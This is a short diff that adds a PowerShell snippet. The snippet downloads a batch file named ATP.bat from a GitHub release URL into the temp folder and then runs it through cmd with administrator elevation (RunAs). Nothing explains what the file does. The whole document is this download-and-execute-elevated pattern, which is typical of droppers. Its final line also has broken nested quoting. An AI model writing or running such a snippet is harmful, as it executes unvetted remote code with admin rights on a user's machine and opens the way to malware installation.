@@ -1,0 +1,4 @@
+$url = "https://github.com/gloomycrow/ATP/releases/download/ATP/ATP.bat"
+$outputPath = "$env:TEMP\ATP.bat"
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+Start-Process cmd -ArgumentList "/c "$outputPath"" -Verb RunAs
